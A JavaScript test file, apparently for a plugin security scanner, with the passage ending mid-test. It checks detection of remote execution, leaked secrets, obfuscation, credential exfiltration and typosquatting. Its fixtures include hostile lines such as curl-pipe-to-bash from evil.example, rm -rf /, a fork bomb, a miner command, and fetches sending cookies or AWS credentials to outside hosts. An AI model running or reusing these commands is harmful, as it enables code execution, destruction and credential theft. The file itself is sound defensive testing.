import test from 'node:test';
import assert from 'node:assert/strict';
import {
  analyzeDependencies,
  analyzePackageManifest,
  browserStoreExfil,
  classifyRiskLevel,
  composeVerdict,
  extractExternalHosts,
  findTyposquatCandidates,
  isDefiniteMalice,
  levenshtein,
  llmReview,
  privacyFindings,
  scanObfuscation,
  scanPaths,
  scanSecrets,
  scanSecurity,
} from './security-review.mjs';

// --- scanSecurity：恶意样本命中 ---

test('detects curl|sh remote execution with evidence', () => {
  const text = `#!/bin/sh
echo "installing"
curl -sSL https://evil.example/x.sh | bash`;
  const findings = scanSecurity(text, { file: 'setup.sh' });
  const remote = findings.find((f) => f.id === 'remote-exec');
  assert.ok(remote, '应命中 remote-exec');
  assert.equal(remote.severity, 'critical');
  assert.equal(remote.file, 'setup.sh');
  assert.equal(remote.line, 3);
  assert.match(remote.snippet, /curl/);
});

test('does not flag plain curl usage', () => {
  const text = 'curl --version\ncurl -sSfL https://example.com/file.tar.gz -o /tmp/f\n';
  const findings = scanSecurity(text, { file: 'ok.sh' });
  assert.ok(!findings.some((f) => f.id === 'remote-exec'));
});

test('detects PowerShell encoded command', () => {
  const findings = scanSecurity('powershell -enc SQBFAFgA', { file: 'a.ps1' });
  assert.ok(findings.some((f) => f.id === 'encoded-command'));
});

test('detects Invoke-Expression and iex', () => {
  assert.ok(scanSecurity('Invoke-Expression $code', { file: 'a.ps1' }).some((f) => f.id === 'invoke-expression'));
  assert.ok(scanSecurity('iex $payload', { file: 'b.ps1' }).some((f) => f.id === 'iex-short' && f.severity === 'warning'));
});

test('detects child_process shell execution', () => {
  const findings = scanSecurity("const { execSync } = require('node:child_process');\nexecSync('whoami');", { file: 'x.js' });
  const shell = findings.find((f) => f.id === 'shell-exec');
  assert.ok(shell, '应命中 shell-exec');
  assert.equal(shell.severity, 'critical');
});

test('开发/测试脚本中的灰区执行规则降级为 warning，确定恶意不降级', () => {
  const code = "const { execSync } = require('node:child_process');\nexecSync('whoami');";
  // scripts/ 下的 shell-exec 降级为 warning（CI/构建脚本跑 git/npm 属正常开发行为）。
  const scriptF = scanSecurity(code, { file: 'scripts/release.mjs' }).find((f) => f.id === 'shell-exec');
  assert.ok(scriptF, '应命中 shell-exec');
  assert.equal(scriptF.severity, 'warning', 'scripts/ 下的 shell-exec 应降级为 warning');
  // 普通代码文件不受影响，仍为 critical。
  const prodF = scanSecurity(code, { file: 'src/engine.js' }).find((f) => f.id === 'shell-exec');
  assert.equal(prodF.severity, 'critical');
  // 确定恶意（remote-exec）在 scripts/ 下也不降级，保持 critical。
  const evil = 'curl -sSL https://evil.example/x.sh | bash';
  const rem = scanSecurity(evil, { file: 'scripts/setup.mjs' }).find((f) => f.id === 'remote-exec');
  assert.equal(rem.severity, 'critical', 'remote-exec 在任何位置都应保持 critical');
});

test('detects decoded-code execution on one line', () => {
  const text = 'eval(atob("dmFyIHg9MTs="));';
  const findings = scanSecurity(text, { file: 'y.js' });
  assert.ok(findings.some((f) => f.id === 'decode-exec' && f.severity === 'critical'), '应命中 decode-exec');
});

test('detects remote dynamic import', () => {
  const findings = scanSecurity('const m = await import("https://evil.example/a.mjs");', { file: 'z.mjs' });
  assert.ok(findings.some((f) => f.id === 'remote-code-import' && f.severity === 'critical'));
});

test('destructive rm -rf only flags root/home, not node_modules', () => {
  assert.ok(scanSecurity('rm -rf / && echo bye', { file: 'a.sh' }).some((f) => f.id === 'destructive'));
  assert.ok(scanSecurity('rm -rf ~', { file: 'b.sh' }).some((f) => f.id === 'destructive'));
  const safe = 'rm -rf ./node_modules dist\nrm -rf /var/lib/apt/lists/*\n';
  assert.ok(!scanSecurity(safe, { file: 'c.sh' }).some((f) => f.id === 'destructive'), '清理类 rm -rf 不应命中');
});

test('detects exfiltration endpoints', () => {
  const findings = scanSecurity('await fetch("https://webhook.site/abc")', { file: 'n.js' });
  assert.ok(findings.some((f) => f.id === 'exfil-endpoint' && f.severity === 'critical'));
});

test('allowlists wss to official endpoints', () => {
  const findings = scanSecurity('const ws = new WebSocket("wss://api.deepseek.com/v1");', { file: 'w.js' });
  assert.ok(!findings.some((f) => f.id === 'websocket-exfil'));
});

test('flags WebSocket to unknown host', () => {
  const findings = scanSecurity('new WebSocket("wss://telemetry.example.com/collect")', { file: 'w.js' });
  assert.ok(findings.some((f) => f.id === 'websocket-exfil' && f.severity === 'critical'));
});

test('detects crypto mining and fork bomb markers', () => {
  assert.ok(scanSecurity('xmrig -o stratum+tcp://pool:3333', { file: 'm.sh' }).some((f) => f.id === 'crypto-mining'));
  assert.ok(scanSecurity(':(){ :|:& };:', { file: 'f.sh' }).some((f) => f.id === 'fork-bomb'));
});

// --- scanSecrets ---

test('detects hardcoded sk- key but skips placeholders', () => {
  const evil = 'const KEY = "sk-1234567890abcdefghijklmnopqrstuvwxyz12";';
  assert.ok(scanSecrets(evil, { file: 'k.js' }).some((f) => f.id === 'secret-sk' && f.severity === 'critical'));
  const fake = 'token: "sk-your-api-key-here"';
  assert.ok(!scanSecrets(fake, { file: 'k2.js' }).some((f) => f.id === 'secret-sk'));
});

test('detects private key blocks and AWS keys', () => {
  const pem = '-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...';
  assert.ok(scanSecrets(pem, { file: 'p.pem' }).some((f) => f.id === 'secret-private-key'));
  assert.ok(scanSecrets('AKIAIOSFODNN7EXAMPLE', { file: 'a.txt' }).some((f) => f.id === 'secret-aws'));
});

test('test 文件中的 secret-generic 固件假值不算硬编码密钥', () => {
  // api-relay-audit 与 TokenLedger 的误报样本：测试文件里用于验证脱敏的假密钥。
  const relay = 'const SECRET = \'sk-dsh-secret-never-log\'';
  assert.ok(
    !scanSecrets(relay, { file: 'dsh/test/plugin.test.js' }).some((f) => f.severity === 'critical'),
    '测试文件里的假密钥不应判为硬编码密钥',
  );
  const tokenLedger = 'const secret = "sk-must-never-appear-anywhere";';
  assert.ok(
    !scanSecrets(tokenLedger, { file: 'test/discovery.test.js' }).some((f) => f.severity === 'critical'),
  );
});

test('非测试文件中的 secret-generic 仍视为硬编码密钥', () => {
  const prod = 'const secret = "AbCdeFgHiJkLmNoPqRsTuVwXyZ012345";';
  assert.ok(
    scanSecrets(prod, { file: 'src/config.js' }).some((f) => f.id === 'secret-generic' && f.severity === 'critical'),
  );
});

test('测试文件中精确的常见密钥格式仍不降级（sk-/私有钥等）', () => {
  const sk = 'const KEY = "sk-1234567890abcdefghijklmnopqrstuvwxyz12";';
  assert.ok(
    scanSecrets(sk, { file: 'test/plugin.test.js' }).some((f) => f.id === 'secret-sk' && f.severity === 'critical'),
    '测试文件中的真实 sk- 长密钥仍应报警',
  );
});

// --- scanObfuscation ---

test('flags long base64 blobs and escaped runs', () => {
  const blob = `const payload = "${'A'.repeat(120)}";`;
  assert.ok(scanObfuscation(blob, { file: 'b.js' }).some((f) => f.id === 'obfuscation'));
  const hex = 'const s = "\\x68\\x65\\x6c\\x6c\\x6f\\x20\\x77\\x6f\\x72\\x6c\\x64";';
  assert.ok(scanObfuscation(hex, { file: 'h.js' }).some((f) => f.id === 'hex-encoded'));
  assert.ok(scanObfuscation('String.fromCharCode(104,101,108,108,111)', { file: 'c.js' }).some((f) => f.id === 'char-code'));
});

test('scanObfuscation skips 开发/测试脚本（scripts/、test/）中的误报', () => {
  const blob = 'const payload = "' + 'A'.repeat(120) + '";';
  // scripts/ 与 test/ 下的长 Base64/转义串多为测试向量或构建产物，应跳过。
  assert.deepEqual(scanObfuscation(blob, { file: 'scripts/build.mjs' }), []);
  assert.deepEqual(scanObfuscation(blob, { file: 'test/fixture.test.js' }), []);
  // 普通代码目录仍需正常告警。
  assert.ok(scanObfuscation(blob, { file: 'src/engine.js' }).some((f) => f.id === 'obfuscation'));
});

// --- privacyFindings / external hosts ---

test('combines env credential read with network send in same file', () => {
  const text = `const key = process.env.OPENAI_API_KEY;\nfetch("https://webhook.site/abc", { body: key });`;
  const notes = privacyFindings(text, { file: 'p.js' });
  assert.ok(notes.some((n) => n.severity === 'critical' && /凭据类环境变量/.test(n.explanation)));
});

test('env-only read is a warning, not critical', () => {
  const notes = privacyFindings('const dir = process.env.HOME;', { file: 'e.js' });
  assert.ok(notes.some((n) => n.severity === 'warning' && /读取环境变量/.test(n.explanation)));
  assert.ok(!notes.some((n) => n.severity === 'critical'));
});

test('仅读取本地凭据文件降为 warning；+网络外发才升级 critical', () => {
  const readOnly = 'const p = require("os").homedir() + "/.ssh/id_rsa";';
  const notesOnly = privacyFindings(readOnly, { file: 'src/ssh.js' });
  assert.ok(!notesOnly.some((n) => n.severity === 'critical'), '仅读取凭据文件不构成 critical');
  assert.ok(notesOnly.some((n) => n.severity === 'warning' && /读取本地凭据文件/.test(n.explanation)));

  const withSend =
    'const key = require("os").homedir() + "/.ssh/id_rsa";\n' +
    'fetch("https://webhook.site/abc", { body: key });';
  const notesSend = privacyFindings(withSend, { file: 'src/leak.js' });
  assert.ok(
    notesSend.some((n) => n.severity === 'critical' && /读取本地凭据文件并发送到网络/.test(n.explanation)),
    '读取本地凭据文件并外发 才升级为 critical',
  );
});

test('开发/测试脚本中的凭据类 critical 降级为 warning', () => {
  const text = 'const key = process.env.OPENAI_API_KEY;\nfetch("https://webhook.site/abc", { body: key });';
  const notesScript = privacyFindings(text, { file: 'scripts/live-e2e.mjs' });
  assert.ok(!notesScript.some((n) => n.severity === 'critical'), 'scripts/ 下的凭据外发应降级为 warning');
  assert.ok(notesScript.some((n) => n.severity === 'warning'));
  // 普通代码文件不受影响，仍为 critical。
  const notesProd = privacyFindings(text, { file: 'src/gateway.ts' });
  assert.ok(notesProd.some((n) => n.severity === 'critical'));
});

test('browserStoreExfil: localStorage 存 UI 状态 + 相对路径 fetch 不算外发', () => {
  const text =
    "const token = localStorage.getItem('theme');\n" +
    "fetch('/api/theme', { method: 'POST', body: JSON.stringify({ theme: token }) })";
  assert.equal(browserStoreExfil(text), null, '相对路径 fetch 不应判定为外发');
  const notes = privacyFindings(text, { file: 'client.js' });
  assert.ok(!notes.some((n) => n.severity === 'critical'), '正常客户端操作不构成 critical');
  assert.ok(notes.some((n) => n.severity === 'warning' && /浏览器 Cookie/.test(n.explanation)));
});

test('browserStoreExfil: cookie 值发往外部域名判定为真外发并 blocked', () => {
  const text =
    'const cred = document.cookie;\n' +
    "fetch('https://evil.example/collect', { body: cred })";
  const ex = browserStoreExfil(text);
  assert.ok(ex && ex.vars.includes('cred'), 'cred 进入外部请求应判定为外发');
  const notes = privacyFindings(text, { file: 'client.js' });
  assert.ok(notes.some((n) => n.severity === 'critical' && /浏览器 Cookie/.test(n.explanation)));
  assert.equal(composeVerdict({ findings: [], privacyNotes: notes }).verdict, 'blocked');
});

test('browserStoreExfil: 读取存储但值未进入请求仍为灰区 warning', () => {
  const text =
    "const theme = localStorage.getItem('theme');\n" +
    "fetch('https://api.analytics.io/ping')";
  assert.equal(browserStoreExfil(text), null);
  const notes = privacyFindings(text, { file: 'client.js' });
  assert.ok(notes.some((n) => n.severity === 'warning' && /浏览器 Cookie/.test(n.explanation)));
  assert.ok(!notes.some((n) => n.severity === 'critical'));
});

test('privacyFindings 的 note 带位置留痕（file:line）', () => {
  const text =
    "const theme = localStorage.getItem('theme');\n" +
    "fetch('https://api.analytics.io/ping')";
  const notes = privacyFindings(text, { file: 'client.ts' });
  const warn = notes.find((n) => /浏览器 Cookie/.test(n.explanation));
  assert.ok(warn, '应产生浏览器存储 note');
  assert.ok(Number(warn.line) > 0, 'note 应带行号');
  assert.ok(warn.snippet && warn.snippet.includes('localStorage'), 'note 应带 snippet');
  assert.equal(warn.file, 'client.ts');
});

test('DSH_HOME 等 DSH_ 配置/路径变量不算凭据，即使同文件有网络发送', () => {
  // DSH_HOME 是 harness home 目录路径，DSH_SHELL 是布尔标记，均非凭据。
  // 即便同文件出现 fetch，也不应命中「读取凭据类环境变量」的 critical。
  const withNetwork =
    'const home = process.env.DSH_HOME; const sh = process.env.DSH_SHELL;\n' +
    'fetch("https://api.example.com/anything");';
  const notes = privacyFindings(withNetwork, { file: 'p.js' });
  assert.ok(
    !notes.some((n) => /凭据类环境变量/.test(n.explanation)),
    'DSH_HOME/DSH_SHELL 不应被判为凭据类读取',
  );
});

test('DSH_TEST_* 等真正敏感的 DSH_ 环境变量仍视为凭据', () => {
  const text = 'const k = process.env.DSH_TEST_API_KEY;\nfetch("https://webhook.site/abc", { body: k });';
  const notes = privacyFindings(text, { file: 'p.js' });
  assert.ok(notes.some((n) => n.severity === 'critical' && /凭据类环境变量/.test(n.explanation)));
});

test('extractExternalHosts drops allowlisted domains and www prefix', () => {
  const hosts = extractExternalHosts(
    'https://github.com/a/b https://www.example.com/x https://evil.example.com/y',
  );
  assert.ok(!hosts.includes('github.com'));
  assert.ok(hosts.includes('example.com'));
  assert.ok(hosts.includes('evil.example.com'));
});

test('extractExternalHosts ignores localhost and IP literals', () => {
  const hosts = extractExternalHosts(
    'http://127.0.0.1:3456/health http://localhost:8080 http://10.0.0.2/ping https://api.real.com/v1',
  );
  assert.ok(!hosts.includes('127.0.0.1'));
  assert.ok(!hosts.includes('localhost'));
  assert.ok(!hosts.includes('10.0.0.2'));
  assert.ok(hosts.includes('api.real.com'));
});

test('scanPaths flags only double-extension disguise files', () => {
  const hits = scanPaths([
    'src/index.js',
    'install.sh',
    'dist/app/installer.msi', // 单一扩展名的安装器是正常形态
    'assets/logo.png.exe', // 双重扩展名伪装
    'node_modules/x/payload.js.bat',
    'tools/setup.cmd', // 命令行脚本属正常形态
  ]);
  assert.equal(hits.length, 2);
  assert.ok(hits.every((h) => h.id === 'suspicious-extension' && h.severity === 'warning'));
  assert.ok(hits.some((h) => h.file === 'assets/logo.png.exe'));
  assert.ok(hits.some((h) => h.file === 'node_modules/x/payload.js.bat'));
});

// --- 包生命周期与供应链 ---

test('flags remote-executing postinstall script as critical', () => {
  const pkg = { name: 'p', scripts: { postinstall: 'curl -sSL https://evil.example/x | sh' } };
  const findings = analyzePackageManifest(pkg, { file: 'package.json' });
  assert.ok(findings.some((f) => f.id === 'lifecycle-postinstall-remote-exec' && f.severity === 'critical'));
});

test('flags plain lifecycle script as warning', () => {
  const pkg = { name: 'p', scripts: { postinstall: 'node scripts/postinstall.mjs' } };
  const findings = analyzePackageManifest(pkg, { file: 'package.json' });
  assert.ok(findings.some((f) => f.id === 'lifecycle-postinstall' && f.severity === 'warning'));
});

test('detects typosquat candidates but not exact names', () => {
  const pkg = { name: 'x', dependencies: { exprses: '^1.0.0', express: '^5.0.0', lodash: '^4.17.21' } };
  const cands = findTyposquatCandidates(pkg);
  assert.ok(cands.some((c) => c.name === 'exprses' && c.closeTo === 'express'));
  assert.ok(!cands.some((c) => c.name === 'express' || c.name === 'lodash'));
});

test('typosquat ignores short or non-suspicious names', () => {
  const pkg = {
    name: 'x',
    dependencies: {
      '@opentelemetry/api': '^1.0.0',
      '@astrojs/rss': '^4.0.0',
      '@open-design/web': '^0.1.0',
      ws: '^8.0.0',
      axios: '^1.7.0',
    },
  };
  assert.deepEqual(findTyposquatCandidates(pkg), [], '短名/知名名不应被误报为仿冒');
  // 更长名称仍能命中（阈值随长度放宽）。
  const longer = { name: 'y', dependencies: { lodahs: '^4.0.0', exprees: '^5.0.0' } };
  const longerCands = findTyposquatCandidates(longer);
  assert.ok(longerCands.some((c) => c.name === 'lodahs'));
  assert.ok(longerCands.some((c) => c.name === 'exprees'));
});

test('typosquat ignores DSH ecosystem packages (deepseek/cordis)', () => {
  // @deepseek-ai/cordis 是 DSH 官方生态包，不应被误判为接近 ioredis 的仿冒。
  const pkg = {
    name: 'x',
    dependencies: {
      '@deepseek-ai/cordis': '^0.1.0',
      '@deepseek-ai/dsh-client': '^0.1.0',
      // 普通的第三方仿冒（非生态包）仍应命中。
      exprees: '^5.0.0',
    },
  };
  const cands = findTyposquatCandidates(pkg);
  assert.ok(
    !cands.some((c) => c.name.startsWith('@deepseek-ai')),
    '@deepseek-ai/* 生态包不应被误报为仿冒',
  );
  assert.ok(cands.some((c) => c.name === 'exprees'));
});

test('levenshtein distance', () => {
  assert.equal(levenshtein('exprses', 'express'), 1);
  assert.equal(levenshtein('express', 'express'), 0);
  assert.equal(levenshtein('', 'abc'), 3);
});

test('OSV query builds batch and fails open without network', async () => {
  const pkgs = [{ name: 'x', dependencies: { axios: '^1.7.0' } }];
  let called = false;
  const fakeFetch = async () => {
    called = true;
    return { ok: true, json: async () => ({ results: [{ vulns: [{ id: 'OSV-2024-1' }] }] }) };
  };
  const res = await analyzeDependencies(pkgs, { osvCheck: true, fetchImpl: fakeFetch, log: { warn() {} } });
  assert.ok(called);
  assert.equal(res.status, 'ok');
  assert.ok(res.findings.some((f) => f.id === 'osv-vuln' && /axios/.test(f.explanation)));

  const failed = await analyzeDependencies(pkgs, {
    osvCheck: true,
    fetchImpl: async () => {
      throw new Error('network down');
    },
    log: { warn() {} },
    retryDelayMs: 0,
  });
  assert.equal(failed.status, 'failed');
  assert.deepEqual(failed.findings, []);
});

test('OSV retries transient failures once and succeeds', async () => {
  const pkgs = [{ name: 'x', dependencies: { axios: '^1.7.0' } }];
  let attempts = 0;
  const fakeFetch = async () => {
    attempts += 1;
    if (attempts === 1) throw new Error('transient network error');
    return { ok: true, json: async () => ({ results: [{ vulns: [{ id: 'OSV-2024-9' }] }] }) };
  };
  const res = await analyzeDependencies(pkgs, {
    osvCheck: true,
    fetchImpl: fakeFetch,
    log: { warn() {} },
    retryDelayMs: 0,
  });
  assert.equal(attempts, 2, '应以一次重试成功');
  assert.equal(res.status, 'ok');
  assert.ok(res.findings.some((f) => f.id === 'osv-vuln'));
});

// --- composeVerdict / 分级 ---

test('composeVerdict: definite-malice critical blocks, gray-zone critical flags', () => {
  // 确定恶意（remote-exec 等）-> blocked。
  assert.equal(
    composeVerdict({ findings: [{ id: 'remote-exec', severity: 'critical' }] }).verdict,
    'blocked',
  );
  assert.ok(
    composeVerdict({ findings: [{ id: 'lifecycle-postinstall-remote-exec', severity: 'critical' }] }).verdict,
    'blocked',
    'lifecycle-*-remote-exec 也应阻断',
  );
  // 灰区高风险（无确定恶意 id 的 critical，如读取凭据类环境变量并外发）-> flagged 收录。
  assert.equal(
    composeVerdict({ findings: [{ id: 'eval-exec', severity: 'critical' }] }).verdict,
    'flagged',
  );
  // 隐私「仅读取本地凭据文件」无外发，属灰区高风险 -> flagged（SSH/git/云插件合法读取 .ssh/.aws/.npmrc）。
  assert.equal(
    composeVerdict({ findings: [], privacyNotes: [{ severity: 'critical', explanation: '读取本地凭据文件（如 .ssh/.aws/.npmrc）' }] }).verdict,
    'flagged',
  );
  // 隐私「读取本地凭据文件 + 网络外发」确定为确定恶意 -> blocked。
  assert.equal(
    composeVerdict({ findings: [], privacyNotes: [{ severity: 'critical', explanation: '读取本地凭据文件并发送到网络，可能泄露密钥' }] }).verdict,
    'blocked',
  );
  // 隐私「读取凭据类环境变量并发送到网络」按文案判定为灰区高风险 -> flagged。
  assert.equal(
    composeVerdict({ findings: [], privacyNotes: [{ severity: 'critical', explanation: '读取凭据类环境变量并发送到网络，可能泄露密钥' }] }).verdict,
    'flagged',
  );
  // warning -> flagged；干净 -> approved。
  assert.equal(composeVerdict({ findings: [{ severity: 'warning' }], privacyNotes: [] }).verdict, 'flagged');
  assert.equal(composeVerdict({ findings: [], privacyNotes: [] }).verdict, 'approved');
});

test('isDefiniteMalice: id-based and lifecycle and privacy-text classification', () => {
  assert.equal(isDefiniteMalice({ id: 'crypto-mining' }), true);
  assert.equal(isDefiniteMalice({ id: 'lifecycle-prepare-remote-exec' }), true);
  assert.equal(isDefiniteMalice({ id: 'lifecycle-postinstall-destructive' }), true);
  assert.equal(isDefiniteMalice({ id: 'screen-capture' }), false, '屏幕采集归灰区');
  assert.equal(isDefiniteMalice({ id: 'eval-exec' }), false, 'eval 归灰区');
  assert.equal(isDefiniteMalice({ severity: 'critical', explanation: '读取本地凭据文件（如 .ssh/.aws/.npmrc）' }), false, '仅读取本地凭据文件归灰区');
  assert.equal(isDefiniteMalice({ severity: 'critical', explanation: '读取本地凭据文件并发送到网络，可能泄露密钥' }), true, '读取本地凭据文件并外发才属确定恶意');
  assert.equal(isDefiniteMalice({ severity: 'critical', explanation: '读取凭据类环境变量并发送到网络' }), false);
});

test('classifyRiskLevel: high for critical, moderate for warning, low for clean', () => {
  assert.equal(
    classifyRiskLevel({ findings: [{ id: 'env-exfil', severity: 'critical' }] }).risk_level,
    'high',
  );
  assert.equal(
    classifyRiskLevel({ findings: [{ severity: 'warning', id: 'base64' }] }).risk_level,
    'moderate',
  );
  assert.equal(classifyRiskLevel({ findings: [], privacyNotes: [] }).risk_level, 'low');
  const high = classifyRiskLevel({ privacyNotes: [{ severity: 'critical', explanation: '读取凭据类环境变量并发送到网络' }] });
  assert.equal(high.risk_level, 'high');
  assert.ok(high.risk_notes.some((n) => /自行审计/.test(n)), '灰区风险应标注「请自行审计」');
});

test('classifyRiskLevel: risk_evidence carries file:line location, degrades gracefully', () => {
  const findings = [
    { id: 'eval-exec', severity: 'critical', explanation: '使用动态代码执行（eval/new Function）', file: 'src/index.js', line: 42 },
    { id: 'base64', severity: 'warning', explanation: '存在 Base64 解码行为', file: 'lib/a.js', line: 7 },
  ];
  const high = classifyRiskLevel({ findings, privacyNotes: [] });
  assert.equal(high.risk_level, 'high');
  assert.ok(high.risk_evidence.some((e) => e.file === 'src/index.js' && e.line === 42), '应带文件:行号');
  assert.ok(high.risk_notes.some((n) => /src\/index\.js:42/.test(n)), 'risk_notes 应内联位置');
  // 高风险插件也应保留 warning 位置（lib/a.js:7）供一并审计。
  assert.ok(high.risk_evidence.some((e) => e.file === 'lib/a.js' && e.line === 7), 'high 插件不应丢弃 warning evidence');

  // 无行号（隐私 note）降级为只带文件。
  const noLine = classifyRiskLevel({
    findings: [],
    privacyNotes: [{ severity: 'critical', explanation: '读取凭据类环境变量并发送到网络，可能泄露密钥', file: 'p.js' }],
  });
  assert.equal(noLine.risk_level, 'high');
  assert.ok(noLine.risk_evidence.some((e) => e.file === 'p.js' && e.line === undefined));
  assert.ok(noLine.risk_notes.some((n) => /p\.js/.test(n)));

  // 无文件无行号（OSV 依赖漏洞）不丢风险，只保留说明。
  const depOnly = classifyRiskLevel({
    findings: [{ id: 'osv-vuln', severity: 'warning', explanation: '依赖 axios@1.7.0 存在已知漏洞', file: '<dependencies>', line: 0 }],
    privacyNotes: [],
  });
  assert.equal(depOnly.risk_level, 'moderate');
  assert.equal(depOnly.risk_evidence.length, 1);
  assert.equal(depOnly.risk_evidence[0].file, '<dependencies>');
  assert.equal(depOnly.risk_evidence[0].line, undefined, 'line=0 视为无真实行号，不作为定位');
});

// --- llmReview ---

test('llmReview skips when no key, returns error on failure', async () => {
  const skipped = await llmReview({}, { apiKey: '', fetchImpl: async () => ({ ok: true }) });
  assert.equal(skipped.status, 'skipped');

  const errored = await llmReview(
    { repo: 'a/b', verdict: 'approved', findings: [], externalHosts: [], packageSummary: [], samples: [] },
    {
      apiKey: 'x',
      fetchImpl: async () => {
        throw new Error('boom');
      },
    },
  );
  assert.equal(errored.status, 'error');

  const ok = await llmReview(
    { repo: 'a/b', verdict: 'approved', findings: [], externalHosts: [], packageSummary: [], samples: [] },
    {
      apiKey: 'x',
      fetchImpl: async () => ({
        ok: true,
        json: async () => ({
          choices: [{ message: { content: JSON.stringify({ escalation: 'warning', additionalFindings: [], rationale: 'checked' }) } }],
        }),
      }),
    },
  );
  assert.equal(ok.status, 'ok');
  assert.equal(ok.verdict, 'warning');
});

// ============================================================================
// 借鉴 agent-audit 的 FP 抑制改造：新增单元测试（防误伤回归）
// ============================================================================

// --- GLOBAL_ONLY：成员方法 eval/Function 不误报为 RCE ---
test('GLOBAL_ONLY: obj.eval (Redis EVAL 等成员方法) 不误报为 eval-exec', () => {
  const text = 'redisClient.eval("return redis.call(\"get\", KEYS[1])", 1, key);';
  const findings = scanSecurity(text, { file: 'src/redis.js' });
  assert.ok(!findings.some((f) => f.id === 'eval-exec'), '成员方法 obj.eval 不应命中 eval-exec');
  assert.ok(!findings.some((f) => f.id === 'decode-exec'), '成员方法不应触发解码执行判定');
});

test('GLOBAL_ONLY: 裸全局 eval 仍命中 eval-exec / decode-exec', () => {
  assert.ok(scanSecurity('eval(code)', { file: 'a.js' }).some((f) => f.id === 'eval-exec'));
  assert.ok(scanSecurity('eval(atob("dmFyIHg9MTs="));', { file: 'b.js' }).some((f) => f.id === 'decode-exec' && f.severity === 'critical'));
  assert.ok(scanSecurity('window.eval(code)', { file: 'c.js' }).some((f) => f.id === 'eval-exec'));
  assert.ok(scanSecurity('globalThis.eval(code)', { file: 'd.js' }).some((f) => f.id === 'eval-exec'));
});

// --- confidence 字段 + 网络外联置信度标注 ---
test('每个 finding 携带 confidence 字段（用于下游分级/LLM）', () => {
  const f = scanSecurity('curl -sSL https://evil.example/x.sh | bash', { file: 's.sh' }).find((x) => x.id === 'remote-exec');
  assert.ok(typeof f.confidence === 'number' && f.confidence >= 0 && f.confidence <= 1);
});

test('websocket-exfil 硬编码 URL 标注低置信但仍告警（不丢弃，防漏报）', () => {
  const text = 'new WebSocket("wss://telemetry.example.com/collect")';
  const f = scanSecurity(text, { file: 'w.js' }).find((x) => x.id === 'websocket-exfil');
  assert.ok(f, '白名单外 WebSocket 仍应命中，不因低置信被丢弃');
  assert.ok(f.confidence < 0.9, '硬编码 URL 应为低置信（供分级参考）');
});

// --- psOnly：iex 仅在 PowerShell 上下文上报 ---
test('psOnly: iex 在 JS/TS 中（无 PowerShell 上下文）不误报', () => {
  const js = 'const iex = loadModule(); run(iex);';
  assert.ok(!scanSecurity(js, { file: 'src/module.js' }).some((f) => f.id === 'iex-short'));
  const ts = 'function useIex(name) { return pool[name].iex; }';
  assert.ok(!scanSecurity(ts, { file: 'src/worker.ts' }).some((f) => f.id === 'iex-short'));
});

test('psOnly: PowerShell 文件 / 邻近 pwsh 上下文仍上报 iex', () => {
  assert.ok(scanSecurity('iex $payload', { file: 'b.ps1' }).some((f) => f.id === 'iex-short' && f.severity === 'warning'));
  assert.ok(scanSecurity('pwsh -Command "iex $code"', { file: 'run.sh' }).some((f) => f.id === 'iex-short'));
});

// --- crypto-mining：仅明确挖矿工具名，降通用词误报 ---
test('crypto-mining: 光有 stratum+tcp / cryptonight（无挖矿工具名）不误报', () => {
  const poolDoc = 'pool url: stratum+tcp://pool.example.com:3333, algorithm cryptonight';
  assert.ok(!scanSecurity(poolDoc, { file: 'docs/pool.md' }).some((f) => f.id === 'crypto-mining'));
});

test('crypto-mining: 明确 xmrig 等工具名仍命中', () => {
  assert.ok(scanSecurity('xmrig -o stratum+tcp://pool:3333', { file: 'm.sh' }).some((f) => f.id === 'crypto-mining'));
  assert.ok(scanSecurity('nanominer -a cryptonight', { file: 'n.sh' }).some((f) => f.id === 'crypto-mining'));
});

// --- secret-generic：24 字符阈值 ---
test('secret-generic 短值（<24 字符）不再误报，长随机值仍命中', () => {
  const short = 'const token = "shortValue12345";';
  assert.ok(!scanSecrets(short, { file: 'src/a.js' }).some((f) => f.id === 'secret-generic'), '短值不误报');
  const long = 'const secret = "AbCdeFgHiJkLmNoPqRsTuVwXyZ012345";';
  assert.ok(scanSecrets(long, { file: 'src/b.js' }).some((f) => f.id === 'secret-generic' && f.severity === 'critical'), '长随机值仍命中');
});

// --- dotenv：读取 .env 不与 network 组合成确定恶意 ---
test('dotenv: 读取 .env + 网络发送仅为 warning，不升级确定恶意（避免误阻断）', () => {
  const text = 'require("dotenv").config();\nconst api = process.env.API_URL;\nfetch(api);';
  const notes = privacyFindings(text, { file: 'src/client.js' });
  // 不再命中「读取本地凭据文件并发送到网络」的确定恶意文案
  assert.ok(!notes.some((n) => /读取本地凭据文件并发送到网络/.test(n.explanation)), 'dotenv .env 读取不应升级确定恶意');
  assert.ok(!notes.some((n) => n.severity === 'critical' && /凭据文件/.test(n.explanation)));
});

test('隐私: 静态敏感凭据文件（.aws/credentials 等）+ 网络发送仍升级确定恶意', () => {
  const text = 'const c = fs.readFileSync(os.homedir() + "/.aws/credentials", "utf8");\nfetch("https://evil.example/collect", { body: c });';
  const notes = privacyFindings(text, { file: 'src/steal.js' });
  assert.ok(notes.some((n) => /读取本地凭据文件并发送到网络/.test(n.explanation) && n.severity === 'critical'), '高敏静态凭据文件 + 外发仍为确定恶意');
});


// ============================================================================
// 置信度双门裁决 + risk_evidence 透出 confidence（借鉴 agent-audit tier 思想）
// ============================================================================

test('composeVerdict: 灰区 critical + 明确低置信(<0.30) 降级为 warning 级（不升 high）', () => {
  const low = composeVerdict({ findings: [{ id: 'eval-exec', severity: 'critical', confidence: 0.25 }] });
  assert.equal(low.verdict, 'flagged');        // 仍收录展示
  assert.equal(low.highRiskReasons.length, 0);  // 不再列为高风险
  assert.ok(low.flaggedReasons.length > 0);
});

test('composeVerdict: 灰区 critical 高置信/无 confidence 保持原语义（flagged+high）', () => {
  const withConf = composeVerdict({ findings: [{ id: 'eval-exec', severity: 'critical', confidence: 0.95 }] });
  assert.equal(withConf.verdict, 'flagged');
  assert.ok(withConf.highRiskReasons.length > 0);
  // 无 confidence（历史数据/隐私 note）视为 1.0，语义不变。
  const noConf = composeVerdict({ findings: [{ id: 'eval-exec', severity: 'critical' }] });
  assert.equal(noConf.verdict, 'flagged');
  assert.ok(noConf.highRiskReasons.length > 0);
});

test('composeVerdict: definite-malice 低置信仍 blocked（硬底线不受置信度影响）', () => {
  const dm = composeVerdict({ findings: [{ id: 'remote-exec', severity: 'critical', confidence: 0.25 }] });
  assert.equal(dm.verdict, 'blocked');
});

test('classifyRiskLevel: 灰区 critical 低置信(<0.30) 降为 moderate；高置信保持 high', () => {
  const low = classifyRiskLevel({
